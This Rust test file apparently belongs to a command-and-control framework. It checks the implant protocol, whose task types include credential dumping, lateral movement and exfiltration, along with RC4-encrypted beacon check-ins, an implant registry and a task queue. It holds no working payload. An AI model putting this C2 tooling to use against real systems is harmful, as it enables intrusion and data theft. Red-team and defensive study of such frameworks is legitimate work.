#[cfg(test)]
mod protocol_tests {
    use crate::protocol::crypto;
    use crate::protocol::tasks::TaskType;
    use crate::protocol::wire;

    #[test]
    fn test_task_type_from_u8() {
        assert_eq!(TaskType::from_u8(0), Some(TaskType::Nop));
        assert_eq!(TaskType::from_u8(1), Some(TaskType::Shell));
        assert_eq!(TaskType::from_u8(2), Some(TaskType::SleepChange));
        assert_eq!(TaskType::from_u8(3), Some(TaskType::Exit));
        assert_eq!(TaskType::from_u8(4), Some(TaskType::FileUpload));
        assert_eq!(TaskType::from_u8(5), Some(TaskType::FileDownload));
        assert_eq!(TaskType::from_u8(6), Some(TaskType::CredDump));
        assert_eq!(TaskType::from_u8(7), Some(TaskType::LateralMove));
        assert_eq!(TaskType::from_u8(8), Some(TaskType::Exfil));
        assert_eq!(TaskType::from_u8(9), Some(TaskType::SocksConnect));
        assert_eq!(TaskType::from_u8(10), Some(TaskType::PortForward));
        assert_eq!(TaskType::from_u8(11), None);
        assert_eq!(TaskType::from_u8(255), None);
    }

    #[test]
    fn test_task_type_names() {
        assert_eq!(TaskType::Nop.name(), "nop");
        assert_eq!(TaskType::Shell.name(), "shell");
        assert_eq!(TaskType::PortForward.name(), "port_forward");
    }

    #[test]
    fn test_rc4_roundtrip() {
        let key = b"testkey123";
        let plaintext = b"hello world this is a test message";
        let encrypted = crypto::encrypt(plaintext, key);
        assert_ne!(&encrypted, plaintext);
        let decrypted = crypto::decrypt(&encrypted, key);
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_rc4_empty() {
        let key = b"key";
        let encrypted = crypto::encrypt(b"", key);
        assert!(encrypted.is_empty());
    }

    #[test]
    fn test_rc4_known_vector() {
        let key = hex::decode("aabbccddee112233").unwrap();
        let plaintext = b"JEBAT";
        let ct = crypto::encrypt(plaintext, &key);
        let pt = crypto::decrypt(&ct, &key);
        assert_eq!(pt, plaintext);
    }

    #[test]
    fn test_checkin_roundtrip() {
        let agent_id: [u8; 16] = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16];
        let hostname = "WORKSTATION-01";
        let sleep_ms = 30000u32;

        let serialized = wire::serialize_checkin(&agent_id, hostname, sleep_ms);
        let parsed = wire::parse_checkin(&serialized).unwrap();

        assert_eq!(parsed.agent_id, agent_id);
        assert_eq!(parsed.hostname, hostname);
        assert_eq!(parsed.sleep_ms, sleep_ms);
    }

    #[test]
    fn test_checkin_message_type() {
        let agent_id = [0u8; 16];
        let data = wire::serialize_checkin(&agent_id, "host", 1000);
        assert_eq!(data[0], 0x01);
    }

    #[test]
    fn test_task_list_roundtrip() {
        let tasks = vec![
            wire::TaskEntry {
                id: 1,
                task_type: TaskType::Shell,
                data: b"whoami".to_vec(),
            },
            wire::TaskEntry {
                id: 2,
                task_type: TaskType::SleepChange,
                data: 60000u32.to_le_bytes().to_vec(),
            },
        ];

        let serialized = wire::serialize_task_list(&tasks);
        assert_eq!(serialized[0], 0x02);

        let parsed = wire::parse_task_list(&serialized).unwrap();
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0].id, 1);
        assert_eq!(parsed[0].task_type, TaskType::Shell);
        assert_eq!(parsed[0].data, b"whoami");
        assert_eq!(parsed[1].id, 2);
        assert_eq!(parsed[1].task_type, TaskType::SleepChange);
    }

    #[test]
    fn test_task_list_empty() {
        let serialized = wire::serialize_task_list(&[]);
        let parsed = wire::parse_task_list(&serialized).unwrap();
        assert!(parsed.is_empty());
    }

    #[test]
    fn test_result_roundtrip() {
        let agent_id: [u8; 16] = [0xAA; 16];
        let output = b"nt authority\\system\n";

        let serialized = wire::serialize_result(&agent_id, 42, true, output);
        assert_eq!(serialized[0], 0x03);

        let parsed = wire::parse_result(&serialized).unwrap();
        assert_eq!(parsed.agent_id, agent_id);
        assert_eq!(parsed.task_id, 42);
        assert!(parsed.success);
        assert_eq!(parsed.output, output);
    }

    #[test]
    fn test_result_failure() {
        let agent_id = [0u8; 16];
        let serialized = wire::serialize_result(&agent_id, 7, false, b"access denied");
        let parsed = wire::parse_result(&serialized).unwrap();
        assert!(!parsed.success);
        assert_eq!(parsed.output, b"access denied");
    }

    #[test]
    fn test_encrypted_checkin_roundtrip() {
        let key = hex::decode("aabbccddee112233").unwrap();
        let agent_id = [0x11; 16];
        let checkin = wire::serialize_checkin(&agent_id, "TARGET-PC", 15000);

        let encrypted = crypto::encrypt(&checkin, &key);
        let decrypted = crypto::decrypt(&encrypted, &key);
        let parsed = wire::parse_checkin(&decrypted).unwrap();

        assert_eq!(parsed.agent_id, agent_id);
        assert_eq!(parsed.hostname, "TARGET-PC");
        assert_eq!(parsed.sleep_ms, 15000);
    }

    #[test]
    fn test_parse_checkin_wrong_type() {
        let mut data = wire::serialize_checkin(&[0; 16], "h", 1000);
        data[0] = 0x02;
        assert!(wire::parse_checkin(&data).is_err());
    }

    #[test]
    fn test_parse_checkin_truncated() {
        assert!(wire::parse_checkin(&[0x01]).is_err());
        assert!(wire::parse_checkin(&[]).is_err());
    }

    #[test]
    fn test_parse_result_truncated() {
        assert!(wire::parse_result(&[0x03, 0, 0]).is_err());
    }
}

#[cfg(test)]
mod storage_tests {
    use crate::storage::db::Database;

    #[test]
    fn test_db_init() {
        let db = Database::open_in_memory().unwrap();
        let implants = db.list_implants().unwrap();
        assert!(implants.is_empty());
    }

    #[test]
    fn test_implant_upsert_new() {
        let db = Database::open_in_memory().unwrap();
        let id = [0x01; 16];
        let is_new = db
            .upsert_implant(&id, "HOST1", 30000, "10.0.0.1", "listener1")
            .unwrap();
        assert!(is_new);

        let implants = db.list_implants().unwrap();
        assert_eq!(implants.len(), 1);
        assert_eq!(implants[0].hostname, "HOST1");
    }

    #[test]
    fn test_implant_upsert_existing() {
        let db = Database::open_in_memory().unwrap();
        let id = [0x02; 16];
        db.upsert_implant(&id, "HOST2", 30000, "10.0.0.2", "l1")
            .unwrap();
        let is_new = db
            .upsert_implant(&id, "HOST2-updated", 60000, "10.0.0.3", "l2")
            .unwrap();
        assert!(!is_new);

        let imp = db.get_implant(&id).unwrap().unwrap();
        assert_eq!(imp.hostname, "HOST2-updated");
        assert_eq!(imp.sleep_ms, 60000);
    }

    #[test]
    fn test_implant_delete() {
        let db = Database::open_in_memory().unwrap();
        let id = [0x03; 16];
        db.upsert_implant(&id, "HOST3", 30000, "", "").unwrap();
        assert!(db.delete_implant(&id).unwrap());
        assert!(!db.delete_implant(&id).unwrap());
        assert!(db.list_implants().unwrap().is_empty());
    }

    #[test]
    fn test_task_queue_and_drain() {
        let db = Database::open_in_memory().unwrap();
        let id = [0x04; 16];
        db.upsert_implant(&id, "HOST4", 30000, "", "").unwrap();

        let t1 = db.queue_task(&id, 1, b"whoami").unwrap();
        let t2 = db.queue_task(&id, 2, &60000u32.to_le_bytes()).unwrap();
        assert!(t1 > 0);
        assert!(t2 > t1);

        let tasks = db.drain_pending_tasks(&id).unwrap();
        assert_eq!(tasks.len(), 2);
        assert_eq!(tasks[0].task_type, 1);
        assert_eq!(tasks[0].data, b"whoami");
        assert_eq!(tasks[1].task_type, 2);

        let drained_again = db.drain_pending_tasks(&id).unwrap();
        assert!(drained_again.is_empty());
    }

    #[test]
    fn test_task_complete() {
        let db = Database::open_in_memory().unwrap();
        let id = [0x05; 16];
        db.upsert_implant(&id, "HOST5", 30000, "", "").unwrap();
        let tid = db.queue_task(&id, 1, b"hostname").unwrap();
        db.drain_pending_tasks(&id).unwrap();

        db.complete_task(tid, true, b"HOST5").unwrap();
        let task = db.get_task(tid).unwrap().unwrap();
        assert_eq!(task.status, "completed");
        assert_eq!(task.success, Some(1));
        assert_eq!(task.output.as_deref(), Some(b"HOST5".as_slice()));
    }

    #[test]
    fn test_task_list_for_implant() {
        let db = Database::open_in_memory().unwrap();
        let id = [0x06; 16];
        db.upsert_implant(&id, "HOST6", 30000, "", "").unwrap();
        db.queue_task(&id, 1, b"cmd1").unwrap();
        db.queue_task(&id, 1, b"cmd2").unwrap();

        let tasks = db.list_tasks_for_implant(&id).unwrap();
        assert_eq!(tasks.len(), 2);
    }

    #[test]
    fn test_event_logging() {
        let db = Database::open_in_memory().unwrap();
        let id = [0x07; 16];
        db.log_event("test_event", Some(&id), None, "detail here")
            .unwrap();
    }
}

#[cfg(test)]
mod core_tests {
    use crate::core::implants::{parse_agent_id, ImplantRegistry};
    use crate::core::taskqueue::TaskQueue;
    use crate::protocol::tasks::TaskType;
    use crate::storage::db::Database;
    use std::sync::Arc;

    fn test_db() -> Arc<Database> {
        Arc::new(Database::open_in_memory().unwrap())
    }

    #[test]
    fn test_parse_agent_id_valid() {
        let id = parse_agent_id("0102030405060708090a0b0c0d0e0f10").unwrap();
        assert_eq!(id[0], 0x01);
        assert_eq!(id[15], 0x10);
    }

    #[test]
    fn test_parse_agent_id_invalid() {
        assert!(parse_agent_id("zz").is_err());
        assert!(parse_agent_id("0102").is_err());
    }

    #[test]
    fn test_registry_checkin_new() {
        let db = test_db();
        let reg = ImplantRegistry::new(db);
        let id = [0xAA; 16];
        let is_new = reg
            .handle_checkin(&id, "PC-NEW", 30000, "10.0.0.1", "l1")
            .unwrap();
        assert!(is_new);

        let implants = reg.list().unwrap();
        assert_eq!(implants.len(), 1);
        assert_eq!(implants[0].hostname, "PC-NEW");
    }

    #[test]
    fn test_registry_checkin_update() {
        let db = test_db();
        let reg = ImplantRegistry::new(db);
        let id = [0xBB; 16];
        reg.handle_checkin(&id, "PC1", 30000, "", "").unwrap();
        let is_new = reg.handle_checkin(&id, "PC1", 60000, "", "").unwrap();
        assert!(!is_new);
    }

    #[test]
    fn test_registry_get_delete() {
        let db = test_db();
        let reg = ImplantRegistry::new(db);
        let id = [0xCC; 16];
        reg.handle_checkin(&id, "PC2", 30000, "", "").unwrap();

        assert!(reg.get(&id).unwrap().is_some());
        assert!(reg.delete(&id).unwrap());
        assert!(reg.get(&id).unwrap().is_none());
    }

    #[test]
    fn test_task_queue_enqueue_drain() {
        let db = test_db();
        db.upsert_implant(&[0xDD; 16], "PC3", 30000, "", "")
            .unwrap();
        let tq = TaskQueue::new(db);
        let id = [0xDD; 16];

        tq.enqueue(&id, TaskType::Shell as u8, b"whoami").unwrap();
        tq.enqueue(&id, TaskType::SleepChange as u8, &60000u32.to_le_bytes())
            .unwrap();

        let entries = tq.drain_for_implant(&id).unwrap();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].task_type, TaskType::Shell);
        assert_eq!(entries[1].task_type, TaskType::SleepChange);

        let empty = tq.drain_for_implant(&id).unwrap();
        assert!(empty.is_empty());
    }

    #[test]
    fn test_task_queue_invalid_type() {
        let db = test_db();
        db.upsert_implant(&[0xEE; 16], "PC4", 30000, "", "")
            .unwrap();
        let tq = TaskQueue::new(db);
        assert!(tq.enqueue(&[0xEE; 16], 99, b"").is_err());
    }

    #[test]
    fn test_task_queue_complete_and_get() {
        let db = test_db();
        db.upsert_implant(&[0xFF; 16], "PC5", 30000, "", "")
            .unwrap();
        let tq = TaskQueue::new(db);
        let id = [0xFF; 16];

        let task_id = tq
            .enqueue(&id, TaskType::Shell as u8, b"hostname")
            .unwrap();
        tq.drain_for_implant(&id).unwrap();
        tq.complete(task_id, true, b"PC5").unwrap();

        let info = tq.get(task_id).unwrap().unwrap();
        assert_eq!(info.status, "completed");
        assert_eq!(info.success, Some(true));
    }
}

#[cfg(test)]
mod config_tests {
    use crate::config::ListenerConfig;

    #[test]
    fn test_rc4_key_bytes() {
        let cfg = ListenerConfig {
            protocol: "https".into(),
            bind: "0.0.0.0".into(),
            port: 443,
            beacon_path: "/beacon".into(),
            result_path: "/result".into(),
            tls_cert: String::new(),
            tls_key: String::new(),
            rc4_key: "aabbccddee112233".into(),
        };
        let key = cfg.rc4_key_bytes().unwrap();
        assert_eq!(key, vec![0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x11, 0x22, 0x33]);
    }

    #[test]
    fn test_rc4_key_bytes_invalid() {
        let cfg = ListenerConfig {
            protocol: "https".into(),
            bind: "0.0.0.0".into(),
            port: 443,
            beacon_path: "/beacon".into(),
            result_path: "/result".into(),
            tls_cert: String::new(),
            tls_key: String::new(),
            rc4_key: "not_hex".into(),
        };
        assert!(cfg.rc4_key_bytes().is_err());
    }
}
